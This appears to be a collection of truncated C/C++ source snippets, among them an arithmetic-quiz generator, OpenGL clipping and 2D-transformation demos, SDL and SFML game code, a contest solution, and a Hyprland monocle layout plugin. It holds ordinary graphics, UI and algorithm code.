    "#include <iostream>\n#include \"Expression.h\"\n\nusing namespace std;\n\nvoid Show_Menu()\n{\n\tExpression v;\n\tint Expression_Num, key;\n\tbool Is_Float, Is_Bracket, Is_Need_File;\n\tstring S1, S2, S3, Ops;\n\tint MaxV;\n\tcout << \"\u8bf7\u8f93\u5165\u8981\u4ea7\u751f\u7684\u56db\u5219\u8fd0\u7b97\u8868\u8fbe\u5f0f\u6570\u91cf:\\n\";\n\tcin >> Expression_Num;\n\tgetchar();\n\tcout << \"\u8bf7\u8f93\u5165\u4f60\u9009\u62e9\u7684\u8fd0\u7b97\u7b26(\u652f\u6301\u4efb\u610f\u8f93\u5165\uff0c\u53ea\u8bc6\u522b\u6709\u6548\u8fd0\u7b97\u7b26(+, -,*,/)\uff0c\u4ee5\u56de\u8f66\u952e\u7ed3\u675f)\\n\";\n\tgetline(cin, Ops);\n\tOps = v.Solve_Input_Ops(Ops);\n\tcout << \"\u8bf7\u8bbe\u7f6e\u6700\u5927\u7684\u8fd0\u7b97\u6570\\n\";\n\tcin >> MaxV;\n\tcout << \"\u7528\u6237\u662f\u5426\u8981\u52a0\u62ec\u53f7?(yes/no)\\n\";\n\tcin >> S1;\n\tcout << \"\u662f\u5426\u6709\u5c0f\u6570?(yes/no)\\n\";\n\tcin >> S2;\n\tcout << \"\u662f\u5426\u60f3\u4fdd\u5b58\u5230\u6587\u4ef6\u4e2d?(yes/no)\\n\";\n\tcin >> S3;\n\tIs_Bracket = (S1 == \"yes\") ? 1 : 0;\n\tIs_Float = (S2 == \"yes\") ? 1 : 0;\n\tIs_Need_File = (S3 == \"yes\") ? 1 : 0;\n\tvector<string> Expressions = v.Generate_Expression(Expression_Num, Ops, MaxV, Is_Bracket, Is_Float);\n\tcout << \"\\n\";\n\tcout << \"\u4ee5\u4e0b\u662f\u751f\u6210\u7684\u8868\u8fbe\u5f0f:\\n\";\n\tfor (auto h : Expressions)\n\t{\n\t\tcout << h << \" = \" << v.Calculate_Expression(h) << \"\\n\";\n\t}\n\tif (Is_Need_File)\n\t\tv.Print_file(Expressions);\n    \n\tcout << \"\u8f93\u51651\uff0c\u7ed3\u675f\u7a0b\u5e8f. \u8f93\u51650, \u91cd\u542f\u7a0b\u5e8f.\";\n\tcin >> key;\n\tif (key)\n\t{\n\t\texit(0);\n\t}\n\tsystem(\"cls\");\n}\n\nint main()\n{\n\tsrand((unsigned)time(NULL));\n\twhile (1)\n\t{\n\t\tShow_Menu();\n\t}\n\treturn 0;\n}",
    "#include<stdio.h>\n#include<GL/gl.h>\n#include<GL/glu.h>\n#include<GL/glut.h>\n#include<math.h>\n\ntypedef struct{\n    float x;\n    float y;\n}PT;\n\nint n;\n\nint i,j;\n\nPT p1,p2,p[20],pp[20];\n\nvoid left(){\n    i=0;j=0;\n    for(i=0;i<n;i++){\n        if(p[i].x<p1.x && p[i+1].x>=p1.x){\n            if(p[i+1].x-p[i].x!=0){\n                pp[j].y=(p[i+1].y-p[i].y)/(p[i+1].x-p[i].x)*(p1.x-p[i].x)+p[i].y;\n            }\n            else{\n                pp[j].y=p[i].y;\n            }\n            pp[j].x=p1.x;\n            j++;\n            pp[j].x=p[i+1].x;\n            pp[j].y=p[i+1].y;\n            j++;\n        }\n\n        if(p[i].x>=p1.x && p[i+1].x>=p1.x){\n            pp[j].y=p[i+1].y;\n            pp[j].x=p[i+1].x;\n            j++;\n        }\n\n        if(p[i].x>=p1.x && p[i+1].x<p1.x){\n            if(p[i+1].x-p[i].x!=0){\n                pp[j].y=(p[i+1].y-p[i].y)/(p[i+1].x-p[i].x)*(p1.x-p[i].x)+p[i].y;\n            }\n            else{\n                pp[j].y=p[i].y;\n            }\n            pp[j].x=p1.x;\n            j++;\n        }\n    }\n\n    for(i=0;i<j;i++){\n        p[i].x=pp[i].x;\n        p[i].y=pp[i].y;\n    }\n\n    p[i].x=pp[0].x;\n    p[i].y=pp[0].y;\n    n=j;\n}\n\nvoid right(){\n    i=0;j=0;\n\n    for(i=0;i<n;i++){\n        if(p[i].x>p2.x && p[i+1].x<=p2.x){\n            if(p[i+1].x-p[i].x!=0){\n                pp[j].y=(p[i+1].y-p[i].y)/(p[i+1].x-p[i].x)*(p2.x-p[i].x)+p[i].y;\n            }\n            else{\n                pp[j].y=p[i].y;\n            }\n            pp[j].x=p2.x;\n            j++;\n            pp[j].x=p[i+1].x;\n            pp[j].y=p[i+1].y;\n            j++;\n        }\n\n        if(p[i].x<=p2.x && p[i+1].x<=p2.x){\n            pp[j].y=p[i+1].y;\n            pp[j].x=p[i+1].x;\n            j++;\n        }\n\n        if(p[i].x<=p2.x && p[i+1].x>p2.x){\n            if(p[i+1].x-p[i].x!=0){\n                pp[j].y=(p[i+1].y-p[i].y)/(p[i+1].x-p[i].x)*(p2.x-p[i].x)+p[i].y;\n            }\n            else{\n                pp[j].y=p[i].y;\n            }\n            pp[j].x=p2.x;\n            j++;\n        }\n    }\n\n    for(i=0;i<j;i++){\n        p[i].x=pp[i].x;\n        p[i].y=pp[i].y;\n    }\n    p[i].x=pp[0].x;\n    p[i].y=pp[0].y;\n}\n\nvoid top(){\n    i=0;j=0;\n\n    for(i=0;i<n;i++){\n        if(p[i].y>p2.y && p[i+1].y<=p2.y){\n            if(p[i+1].y-p[i].y!=0){\n                pp[j].x=(p[i+1].x-p[i].x)/(p[i+1].y-p[i].y)*(p2.y-p[i].y)+p[i].x;\n            }\n            else{\n                pp[j].x=p[i].x;\n            }\n            pp[j].y=p2.y;\n            j++;\n            pp[j].x=p[i+1].x;\n            pp[j].y=p[i+1].y;\n            j++;\n        }\n\n        if(p[i].y<=p2.y && p[i+1].y<=p2.y){\n            pp[j].y=p[i+1].y;\n            pp[j].x=p[i+1].x;\n            j++;\n        }\n\n        if(p[i].y<=p2.y && p[i+1].y>p2.y){\n            if(p[i+1].y-p[i].y!=0){\n                pp[j].x=(p[i+1].x-p[i].x)/(p[i+1].y-p[i].y)*(p2.y-p[i].y)+p[i].x;\n            }\n            else{\n                pp[j].x=p[i].x;\n            }\n            pp[j].y=p2.y;\n            j++;\n        }\n    }\n\n    for(i=0;i<j;i++){\n        p[i].x=pp[i].x;\n        p[i].y=pp[i].y;\n    }\n    p[i].x=pp[0].x;\n    p[i].y=pp[0].y;\n    n=j;\n}\n\n\nvoid bottom(){\n    i=0;j=0;\n\n    for(i=0;i<n;i++){\n        if(p[i].y<p1.y && p[i+1].y>=p1.y){\n            if(p[i+1].y-p[i].y!=0){\n                pp[j].x=(p[i+1].x-p[i].x)/(p[i+1].y-p[i].y)*(p1.y-p[i].y)+p[i].x;\n            }\n            else{\n                pp[j].x=p[i].x;\n            }\n            pp[j].y=p1.y;\n            j++;\n            pp[j].x=p[i+1].x;\n            pp[j].y=p[i+1].y;\n            j++;\n        }\n\n        if(p[i].y>=p1.y && p[i+1].y>=p1.y){\n            pp[j].x=p[i+1].x;\n            pp[j].y=p[i+1].y;\n            j++;\n        }\n\n        if(p[i].y>=p1.y && p[i+1].y<p1.y){\n            if(p[i+1].y-p[i].y!=0){\n                pp[j].x=(p[i+1].x-p[i].x)/(p[i+1].y-p[i].y)*(p1.y-p[i].y)+p[i].x;\n            }\n            else{\n                pp[j].x=p[i].x;\n            }\n            pp[j].y=p1.y;\n            j++;\n        }\n    }\n\n    for(i=0;i<j;i++){\n        p[i].x=pp[i].x;\n        p[i].y=pp[i].y;\n    }\n    p[i].x=pp[0].x;\n    p[i].y=pp[0].y;\n    n=j;\n}\n\nvoid drawpolygon(){\n    glColor3f(0.0,1.0,1.0);\n    for(i=0;i<n-1;i++){\n        glBegin(GL_LINES);\n        glVertex2d(p[i].x,p[i].y);\n        glVertex2d(p[i+1].x,p[i+1].y);\n        glEnd();\n    }\n    glBegin(GL_LINES);\n    glVertex2d(p[i].x,p[i].y);\n    glVertex2d(p[0].x,p[0].y);\n    glEnd();\n}\n\nvoid myMouse(int button, int state, int x, int y){\n    if(button==GLUT_LEFT_BUTTON && state==GLUT_DOWN){\n        glClear(GL_COLOR_BUFFER_BIT);\n        glBegin(GL_LINE_LOOP);\n        glVertex2f(p1.x,p1.y);\n        glVertex2f(p2.x,p1.y);\n        glVertex2f(p2.x,p2.y);\n        glVertex2f(p1.x,p2.y);\n        glEnd();\n        left();\n        right();\n        top();\n        bottom();\n        drawpolygon();\n    }\n    glFlush();\n}\n\n\nvoid display(void){\n    glClear(GL_COLOR_BUFFER_BIT);\n    glColor3f(0.4,0.0,1.0);\n    glBegin(GL_LINE_LOOP);\n    glVertex2f(p1.x, p1.y);\n    glVertex2f(p2.x,p1.y);\n    glVertex2f(p2.x,p",
    "\r\n//boundary check\r\n        /**\r\n        //right boudary\r\n        if (birdRect.x + birdRect.w > 1280)\r\n            birdRect.x = 1280 - birdRect.w;\r\n        // left boundary\r\n        if (birdRect.x < 0)\r\n            birdRect.x = 0;\r\n        **/\r\n\r\n//-- -\r\n\r\n/**case SDL_SCANCODE_A:\r\n                    case SDL_SCANCODE_LEFT:\r\n                        birdRect.x -= speed / 30;\r\n                        break;\r\n                    case SDL_SCANCODE_S:\r\n                    case SDL_SCANCODE_DOWN:\r\n                        birdRect.y += speed / 30;\r\n                        break;\r\n                    case SDL_SCANCODE_D:\r\n                    case SDL_SCANCODE_RIGHT:\r\n                        birdRect.x += speed / 30;\r\n                        break;**/\r\n\r\n    //-- -\r\n    //cpp\r\n    /*void setDefaultBackground(SDL_Renderer*& renderer)\r\n{\r\n    SDL_SetRenderDrawColor(renderer, 113, 197, 207, 255);\r\n    SDL_RenderClear(renderer);\r\n}*/\r\n\r\n//header\r\n//void setDefaultBackground(SDL_Renderer*& renderer);\r\n\r\n//---\r\n\r\n//Full-screen Mode\r\n    //window = SDL_CreateWindow(WINDOW_TITLE.c_str(), SDL_WINDOWPOS_CENTERED,\r\n    //SDL_WINDOWPOS_CENTERED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_FULLSCREEN_DESKTOP);\r\n\r\n    //-- -\r\n    //Software-Renderer\r\n        //renderer = SDL_CreateSoftwareRenderer(SDL_GetWindowSurface(window));",
    "#include<bits/stdc++.h>\nusing namespace std;\nusing ll = long long;\nint main(){\n    ios::sync_with_stdio(0);cin.tie(0);\n    ll m,n,k,r,e;\n    cin >> m >> n >> e >> k >> r;\n    vector<ll> c(e);\n    for(ll &i : c) cin >> i;\n    ll low = max(1ll,r-k+1);\n    ll high = min(m-k+1,r);\n    ll dh = high-low+1;\n    ll ans = 0;\n    vector<ll> v; // \u6536\u96c6\u95dc\u9375\u9ede\n    for(ll i : c){\n        v.push_back(i);\n        v.push_back(i+k);\n    }\n    v.push_back(k);\n    v.push_back(n+1);\n    sort(v.begin(),v.end());\n    v.erase(unique(v.begin(),v.end()),v.end());\n    v.erase(upper_bound(v.begin(),v.end(),n+1),v.end()); // \u524d\u9762\u4e0d\u6aa2\u67e5\uff0c\u5728\u9019\u88e1\u522a\u6389\u8d85\u51fa\u53bb\u7684\n    v.erase(v.begin(),lower_bound(v.begin(),v.end(),k));\n    for(ll i = 0;i<v.size()-1;i++){\n        ll width = v[i+1]-v[i]; // k*k\u6846\u6846\u6700\u53f3\u65b9\u9ede\uff0c\u5de6\u9589\u53f3\u958b\uff0c1-base\n        ll L = v[i]-k+1;\n        ll R = v[i];\n        ll cur = upper_bound(c.begin(),c.end(),R) - lower_bound(c.begin(),c.end(),L);\n        if(cur&1) ans+=width;\n    }\n    ans*=dh;\n    if(k&1) ans = (m-k+1)*(n-k+1) - ans;\n    cout << ans << \"\\n\";\n}\n",
    "#include \"../headers/Buttons.h\"\n#include \"../headers/GetTexture.h\"\n#include <SDL2/SDL.h>\n#include <SDL2/SDL_image.h>\n#include <SDL2/SDL_ttf.h>\n#include <string>\n\nbutton::button(SDL_Renderer *Renderer, std::string text, int x, int y) {\n  buttonRenderer = Renderer;\n  textFont = TTF_OpenFont(\"assets/fonts/Kanit-Bold.ttf\", 45);\n  textColor = {255, 255, 255, 255};\n  buttonTexture = GetTexture(buttonRenderer, \"assets/img/rect.png\");\n  hoverTexture = GetTexture(buttonRenderer, \"assets/img/rect.png\");\n  clickTexture = GetTexture(buttonRenderer, \"assets/img/rect.png\");\n  SDL_SetTextureColorMod(buttonTexture, 0, 90, 255);\n  SDL_SetTextureColorMod(hoverTexture, 255, 200, 0);\n  SDL_SetTextureColorMod(clickTexture, 100, 100, 100);\n  currentTexture = buttonTexture;\n  currentState = KeyGone;\n  buttonBox.x = x;\n  buttonBox.y = y;\n  SDL_QueryTexture(buttonTexture, NULL, NULL, &buttonBox.w, &buttonBox.h);\n  textTexture = GetTexture(buttonRenderer, textFont, text, textColor, &textBox);\n  textBox.x = x + (buttonBox.w - textBox.w) / 2;\n  textBox.y = y + (buttonBox.h - textBox.h) / 2;\n}\n\nvoid button::CopyToRenderer() {\n  SDL_RenderCopy(buttonRenderer, currentTexture, NULL, &buttonBox);\n  SDL_RenderCopy(buttonRenderer, textTexture, NULL, &textBox);\n}\n\nvoid button::SetTexture(buttonState state) {\n  if (state == KeyGone)\n    currentTexture = buttonTexture;\n  else if (state == KeyOver)\n    currentTexture = hoverTexture;\n  else if (state == KeyDown)\n    currentTexture = clickTexture;\n}\nbutton::~button() {\n  SDL_DestroyTexture(buttonTexture);\n  buttonTexture = NULL;\n  SDL_DestroyTexture(hoverTexture);\n  hoverTexture = NULL;\n  SDL_DestroyTexture(clickTexture);\n  clickTexture = NULL;\n  currentTexture = NULL;\n  SDL_DestroyTexture(textTexture);\n  textTexture = NULL;\n}\n",
    "#include <hyprland/src/Compositor.hpp>\n#include <hyprland/src/desktop/DesktopTypes.hpp>\n#include <hyprland/src/desktop/Workspace.hpp>\n#include <hyprland/src/helpers/MiscFunctions.hpp>\n#include <hyprland/src/render/decorations/CHyprGroupBarDecoration.hpp>\n#include <format>\n#include <hyprland/src/render/decorations/IHyprWindowDecoration.hpp>\n#include \"monocleLayout.hpp\"\n\n\nSMonocleNodeData* CHyprMonocleLayout::getNodeFromWindow(PHLWINDOW pWindow) {\n    for (auto& nd : m_lMonocleNodesData) {\n        if (nd.pWindow.lock() == pWindow)\n            return &nd;\n    }\n\n    return nullptr;\n}\n\nint CHyprMonocleLayout::getNodesOnWorkspace(const int& ws) {\n    int no = 0;\n    for (auto& n : m_lMonocleNodesData) {\n        if (n.workspaceID == ws)\n            no++;\n    }\n\n    return no;\n}\n\nstd::string CHyprMonocleLayout::getLayoutName() {\n    return \"Monocle\";\n}\n\nvoid CHyprMonocleLayout::onWindowCreatedTiling(PHLWINDOW pWindow, eDirection direction) {\n    if (pWindow->m_bIsFloating)\n        return;\n\n\t\tconst auto WSID = pWindow->workspaceID();\n\t\t\n\t\t\t\n    const auto         PMONITOR = g_pCompositor->getMonitorFromID(pWindow->m_iMonitorID);\n\n    auto               OPENINGON = g_pCompositor->m_pLastWindow.lock() && g_pCompositor->m_pLastWindow.lock()->m_pWorkspace == pWindow->m_pWorkspace ? g_pCompositor->m_pLastWindow.lock() : nullptr;\n\n\t\tconst auto\t\t\t\tMOUSECOORDS = g_pInputManager->getMouseCoordsInternal();\n\t\t\n\n\n\n\t\tif (g_pInputManager->m_bWasDraggingWindow && OPENINGON) {\n\t\t\tif (pWindow->checkInputOnDecos(INPUT_TYPE_DRAG_END, MOUSECOORDS, pWindow))\n\t\t\t\treturn;\n\t\t}\n\n    if (OPENINGON && OPENINGON != pWindow && OPENINGON->m_sGroupData.pNextWindow.lock() // target is group\n        && pWindow->canBeGroupedInto(OPENINGON)) {\n\n\n        static const auto* USECURRPOS = (Hyprlang::INT* const*)g_pConfigManager->getConfigValuePtr(\"group:insert_after_current\");\n        (**USECURRPOS ? OPENINGON : OPENINGON->getGroupTail())->insertWindowToGroup(pWindow);\n\n        OPENINGON->setGroupCurrent(pWindow);\n        pWindow->applyGroupRules();\n        pWindow->updateWindowDecos();\n        recalculateWindow(pWindow);\n        if(!pWindow->getDecorationByType(DECORATION_GROUPBAR))\n\t\t\t      pWindow->addWindowDeco(std::make_unique<CHyprGroupBarDecoration>(pWindow));\n\n        return;\n    }\n\n    pWindow->applyGroupRules();\n    const auto PNODE = &m_lMonocleNodesData.emplace_front();\n\t  PNODE->workspaceID = pWindow->workspaceID();\n\t  PNODE->pWindow = pWindow;\n    if (g_pCompositor->getWorkspaceByID(WSID)->m_bHasFullscreenWindow) {\n\t      g_pCompositor->setWindowFullscreen(g_pCompositor->getFullscreenWindowOnWorkspace(pWindow->workspaceID()), false, FULLSCREEN_FULL);\n    }\n\n    recalculateMonitor(pWindow->m_iMonitorID);\n\t  g_pCompositor->setWindowFullscreen(pWindow, true, FULLSCREEN_MAXIMIZED);\n\t  g_pCompositor->focusWindow(pWindow);\n}\n\nvoid CHyprMonocleLayout::onWindowRemovedTiling(PHLWINDOW pWindow) {\n    const auto PNODE = getNodeFromWindow(pWindow);\n\n    if (!PNODE)\n        return;\n\n    pWindow->m_sSpecialRenderData.rounding = true;\n    pWindow->m_sSpecialRenderData.border   = true;\n    pWindow->m_sSpecialRenderData.decorate = true;\n\n    if (pWindow->m_bIsFullscreen)\n        g_pCompositor->setWindowFullscreen(pWindow, false, FULLSCREEN_FULL);\n\n    m_lMonocleNodesData.remove(*PNODE);\n\n    recalculateMonitor(pWindow->m_iMonitorID);\n\t  \n}\n\nvoid CHyprMonocleLayout::recalculateMonitor(const int& monid) {\n    const auto PMONITOR   = g_pCompositor->getMonitorFromID(monid);\n    const auto PWORKSPACE = PMONITOR->activeWorkspace;\n\n    if (!PWORKSPACE)\n        return;\n\n    g_pHyprRenderer->damageMonitor(PMONITOR);\n\n    if (PMONITOR->activeSpecialWorkspace) {\n        calculateWorkspace(PMONITOR->activeSpecialWorkspace);\n    }\n\n    if (PWORKSPACE->m_bHasFullscreenWindow) {\n        if (PWORKSPACE->m_efFullscreenMode == FULLSCREEN_FULL)\n            return;\n\n        // massive hack from the fullscreen func\n        const auto      PFULLWINDOW = g_pCompositor->getFullscreenWindowOnWorkspace(PWORKSPACE->m_iID);\n\n        SMonocleNodeData fakeNode;\n        fakeNode.pWindow         = PFULLWINDOW;\n        fakeNode.position        = PMONITOR->vecPosition + PMONITOR->vecReservedTopLeft;\n        fakeNode.size            = PMONITOR->vecSize - PMONITOR->vecReservedTopLeft - PMONITOR->vecReservedBottomRight;\n        fakeNode.workspaceID     = PWORKSPACE->m_iID;\n        PFULLWINDOW->m_vPosition = fakeNode.position;\n        PFULLWINDOW->m_vSize     = fakeNode.size;\n\n        applyNodeDataToWindow(&fakeNode);\n\n        return;\n    }\n\n    // calc the WS\n    calculateWorkspace(PWORKSPACE);\n}\n\nvoid CHyprMonocleLayout::calculateWorkspace(PHLWORKSPACE PWORKSPACE) {\n    if (!PWORKSPACE)\n        return;\n\n    const auto         PMONITOR = g_pCompositor->getMonitorFromID(PWORKSPACE->m_iMonitorID);\n\t  for(auto &md : m_lMonocleNodesData) {\n        if (md.workspaceID != PWORKSPACE->m_iID)\n\t\t\t    continue;\n\t\t   \tmd.position = PMONITOR->vecPosition  + PMONITOR->vecReservedTopLeft + Vector2D(0.0f, 0.",
    "#include<iostream>\n#include<stdio.h>\n#include<GL/glut.h>\n#include<stdlib.h>\n#include<math.h>\nusing namespace std;\n\nstatic int menu_id,submenu_id;\nfloat x1,yy1,x2,y2,x3,y3,tx,ty,ABC[3][2];\nvoid init(void);\nvoid display(void);\nvoid draw_original();\nvoid menu(int);\nvoid translation();\nvoid scaling();\nvoid rotation();\nvoid shearing();\nvoid reflection();\n\nint main(int argc,char *argv[])\n{\n\tx1=50;\n\tyy1=150;\n\n\tx2=400;\n\ty2=100;\n\n\tx3=200;\n\ty3=346.41;\n\n\tglutInit(&argc,argv);\n\tglutInitDisplayMode(GLUT_SINGLE|GLUT_RGB);\n\tglutInitWindowSize(1000,1000);\n\tglutInitWindowPosition(100,100);\n\tglutCreateWindow(\"2D-TRANSFORMATIONS\");\n\tinit();\n\tglutDisplayFunc(display);\n\tsubmenu_id=glutCreateMenu(menu);\n\tglutAddMenuEntry(\"------MENU------\",0);\n\tglutAddMenuEntry(\"1)TRANSLATION\",1);\n\tglutAddMenuEntry(\"2)SCALING\",2);\n\tglutAddMenuEntry(\"3)ROTATION\",3);\n\tglutAddMenuEntry(\"4)SHEARING\",4);\n\tglutAddMenuEntry(\"5)REFLECTION\",5);\n\tmenu_id=glutCreateMenu(menu);\n\tglutAddSubMenu(\"DRAW\",submenu_id);\n\tglutAddMenuEntry(\"EXIT\",6);\n\tglutAttachMenu(GLUT_RIGHT_BUTTON);\n\tglutMainLoop();\n\n\treturn(0);\n}\n\nvoid init(void)\n{\n\tglClearColor(0.0,0.0,0.0,1.0);\n\tglMatrixMode(GL_PROJECTION);\n\tglLoadIdentity();\n\tgluOrtho2D(-1000.0,1000.0,-1000.0,1000.0);\n\n}\n\nvoid display(void)\n{\n\tglClear(GL_COLOR_BUFFER_BIT|GL_DEPTH_BUFFER_BIT);\n\n\tglColor3f(1.0,1.0,1.0);\n\tglBegin(GL_LINES);\n\tglVertex2i(-1000,0);\n\tglVertex2i(1000,0);\n\tglVertex2i(0,-1000);\n\tglVertex2i(0,1000);\n\tglEnd();\n\tglFlush();\n\tdraw_original();\n}\n\nvoid draw_original()\n{\n\tglColor3f(1.0,0.0,0.0);\n\tglBegin(GL_LINE_LOOP);\n\tglVertex2f(x1,yy1);\n\tglVertex2f(x2,y2);\n\tglVertex2f(x3,y3);\n\tglEnd();\n\tglFlush();\n\n}\n\nvoid menu(int key)\n{\n\tswitch(key)\n\t{\n\t\tcase 1:\n\t\t\ttranslation();\n\t\t\tbreak;\n\n\t\tcase 2:\n\t\t\tscaling();\n\t\t\tbreak;\n\n\t\tcase 3:\n\t\t\trotation();\n\t\t\tbreak;\n\n\t\tcase 4:\n\t\t\tshearing();\n\t\t\tbreak;\n\n\t\tcase 5:\n\t\t\treflection();\n\t\t\tbreak;\n\n\t\tcase 6:\n\t\t\texit(0);\n\n\t}\n\n}\n\nvoid translation()\n{\n\tprintf(\"\\n\");\n\tprintf(\"Enter the translation factor tx:\");\n\tscanf(\"%f\",&tx);\n\n\tprintf(\"\\n\");\n\tprintf(\"Enter the translation factor ty:\");\n\tscanf(\"%f\",&ty);\n\n\tABC[0][0]=x1;\n\tABC[0][1]=yy1;\n\n\tABC[1][0]=x2;\n\tABC[1][1]=y2;\n\n\tABC[2][0]=x3;\n\tABC[2][1]=y3;\n\n\tABC[0][0]=ABC[0][0]+tx;\n\tABC[0][1]=ABC[0][1]+ty;\n\n\tABC[1][0]=ABC[1][0]+tx;\n\tABC[1][1]=ABC[1][1]+ty;\n\n\tABC[2][0]=ABC[2][0]+tx;\n\tABC[2][1]=ABC[2][1]+ty;\n\n\tglColor3f(1.0,1.0,0.0);\n\tglBegin(GL_LINE_LOOP);\n\tglVertex2f(ABC[0][0],ABC[0][1]);\n\tglVertex2f(ABC[1][0],ABC[1][1]);\n\tglVertex2f(ABC[2][0],ABC[2][1]);\n\tglEnd();\n\tglFlush();\n\n}\n\nvoid scaling()\n{\n\tfloat sx,sy;\n\n\tprintf(\"\\n\");\n\tprintf(\"Enter the scaling factor sx:\");\n\tscanf(\"%f\",&sx);\n\n\tprintf(\"\\n\");\n\tprintf(\"Enter the scaling factor sy:\");\n\tscanf(\"%f\",&sy);\n\n\tABC[0][0]=x1;\n\tABC[0][1]=yy1;\n\n\tABC[1][0]=x2;\n\tABC[1][1]=y2;\n\n\tABC[2][0]=x3;\n\tABC[2][1]=y3;\n\n\tABC[0][0]=x1*sx;\n\tABC[0][1]=yy1*sy;\n\n\tABC[1][0]=x2*sx;\n\tABC[1][1]=y2*sy;\n\n\tABC[2][0]=x3*sx;\n\tABC[2][1]=y3*sy;\n\n\tglColor3f(0.0,1.0,0.0);\n\tglBegin(GL_LINE_LOOP);\n\tglVertex2f(ABC[0][0],ABC[0][1]);\n\tglVertex2f(ABC[1][0],ABC[1][1]);\n\tglVertex2f(ABC[2][0],ABC[2][1]);\n\tglEnd();\n\tglFlush();\n\n}\n\nvoid rotation()\n{\n\tfloat angle,x,y;\n\tint choice;\n\n\tprintf(\"\\n\");\n\tprintf(\"Enter the angle for rotation:\");\n\tscanf(\"%f\",&angle);\n\n\tx=0.01745*angle;\n\n\tbegin:printf(\"\\n\");\n\tprintf(\"1)ANTI-CLOCKWISE\\n\");\n\tprintf(\"2)CLOCKWISE\\n\");\n\tprintf(\"Enter your choice:\");\n\tscanf(\"%d\",&choice);\n\n\tABC[0][0]=x1;\n\tABC[0][1]=yy1;\n\n\tABC[1][0]=x2;\n\tABC[1][1]=y2;\n\n\tABC[2][0]=x3;\n\tABC[2][1]=y3;\n\n\tswitch(choice)\n\t{\n\t\tcase 1:\n\n\t\t\tABC[0][0]=(x1*cos(x)-yy1*sin(x));\n\t\t\tABC[0][1]=(x1*sin(x)+yy1*cos(x));\n\n\t\t\tABC[1][0]=(x2*cos(x)-y2*sin(x));\n\t\t\tABC[1][1]=(x2*sin(x)+y2*cos(x));\n\n\t\t\tABC[2][0]=(x3*cos(x)-y3*sin(x));\n\t\t\tABC[2][1]=(x3*sin(x)+y3*cos(x));\n\n\t\t\tglColor3f(0.0,0.0,1.0);\n\t\t\tglBegin(GL_LINE_LOOP);\n\t\t\tglVertex2f(ABC[0][0],ABC[0][1]);\n\t\t\tglVertex2f(ABC[1][0],ABC[1][1]);\n\t\t\tglVertex2f(ABC[2][0],ABC[2][1]);\n\t\t\tglEnd();\n\t\t\tglFlush();\n\n\t\t\tbreak;\n\n\t\tcase 2:\n\n\t\t\tABC[0][0]=(x1*cos(x)+yy1*sin(x));\n\t\t\tABC[0][1]=(yy1*cos(x)-x1*sin(x));\n\n\t\t\tABC[1][0]=(x2*cos(x)+y2*sin(x));\n\t\t\tABC[1][1]=(y2*cos(x)-x2*sin(x));\n\n\t\t\tABC[2][0]=(x3*cos(x)+y3*sin(x));\n\t\t\tABC[2][1]=(y3*cos(x)-x3*sin(x));\n\n\t\t\tglColor3f(0.0,0.0,1.0);\n\t\t\tglBegin(GL_LINE_LOOP);\n\t\t\tglVertex2f(ABC[0][0],ABC[0][1]);\n\t\t\tglVertex2f(ABC[1][0],ABC[1][1]);\n\t\t\tglVertex2f(ABC[2][0],ABC[2][1]);\n\t\t\tglEnd();\n\t\t\tglFlush();\n\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tprintf(\"\\n\");\n\t\t\tprintf(\"Enter valid choice!!!\\n\");\n\t\t\tgoto begin;\n\n\t}\n\n}\n\nvoid shearing()\n{\n\tfloat shx,shy;\n\n\tprintf(\"\\n\");\n\tprintf(\"Enter shearing factor shx:\");\n\tscanf(\"%f\",&shx);\n\n\tprintf(\"\\n\");\n\tprintf(\"Enter shearing factor shy:\");\n\tscanf(\"%f\",&shy);\n\n\tABC[0][0]=x1;\n\tABC[0][1]=yy1;\n\n\tABC[1][0]=x2;\n\tABC[1][1]=y2;\n\n\tABC[2][0]=x3;\n\tABC[2][1]=y3;\n\n\tABC[0][0]=abs(ABC[0][0]+shx*yy1);\n\tABC[0][1]=abs(ABC[0][1]+shy*x1);\n\n\tABC[1][0]=abs(ABC[1][0]+shx*y2);\n\tABC[1][1]=abs(ABC[1][1]+shy*x2);\n\n\tABC[2][0]=abs(ABC[2][0]+shx*y3);\n\tABC[2][1]=abs(ABC[2][1]+shy*x3);\n\n\tglColor3f(1.0,0.0,1.0);\n\tglBegin(GL_LINE_LOOP);\n\tglVertex2f(ABC[0][0],ABC[0][1]);\n\tglVertex2f(ABC[1][0],ABC[1][1]);\n\tglVer",
    "\ufeff#include \"firework.h\"\n\nconstexpr float gravity = 500.0f;\n\nint main() {\n    sf::ContextSettings settings;\n    settings.antialiasingLevel = 8;\n\n    sf::RenderWindow window(sf::VideoMode(1600, 900), \"SpaceBar to clear screen\", sf::Style::Close, settings);\n    window.setFramerateLimit(120);\n\n    sf::Font font;\n    font.loadFromFile(\"OpenSans-Regular.ttf\");\n\n    sf::Text fpsText;\n    fpsText.setFont(font);\n    fpsText.setCharacterSize(36); \n    fpsText.setFillColor(sf::Color::Red);\n    fpsText.setPosition(10, 10);\n\n    sf::Event event;\n\n    sf::Clock fpsClock;\n    unsigned int frameCount = 0;\n    sf::Clock deltaClock;\n    float dt = 1.0f / 60.0f; // 1/60 seconds\n\n    //this is to render texture for the fireworks\n    sf::RenderTexture fadeTexture;\n    fadeTexture.create(1600, 900);\n\n    sf::CircleShape blastBoom; // this represents the blast\n    blastBoom.setRadius(50);\n    blastBoom.setPointCount(100);\n\n    std::vector<Firework> Fireworks; // store alr drawn fireworks\n    std::vector<Firework> FireWorksAftermath; // store the effects of splash\n\n    bool MousePressed = false;\n    bool SpacePressed = false;\n\n    while (window.isOpen()) {\n        while (window.pollEvent(event)) {\n            switch (event.type) {\n            case sf::Event::Closed:\n                window.close();\n                break;\n            case sf::Event::MouseButtonPressed:\n                if (event.mouseButton.button == sf::Mouse::Left) {\n                    sf::Vector2f mousePos(sf::Mouse::getPosition(window)); //mouse pos relative to current active window\n\n                    Fireworks.emplace_back\n                    (\n                        (float)randomInt(12, 16),\n                        sf::Vector2f(mousePos.x, mousePos.y), //  use mouse position without offset\n                        sf::Vector2f{},\n                        sf::Color((sf::Uint8)randomInt(120, 255), (sf::Uint8)randomInt(120, 255), (sf::Uint8)randomInt(120, 255))\n                    );\n\n                    MousePressed = true;\n                }\n                break; //these needs to go both ways\n            case sf::Event::KeyPressed:\n                if (event.key.code == sf::Keyboard::Space) {\n                    Fireworks.clear();\n                    FireWorksAftermath.clear();\n                    fadeTexture.clear();\n                    SpacePressed = true; \n                }\n                break;\n            case sf::Event::KeyReleased:\n                if (event.key.code == sf::Keyboard::Space) {\n                    SpacePressed = false; \n                }\n                break;\n            }\n        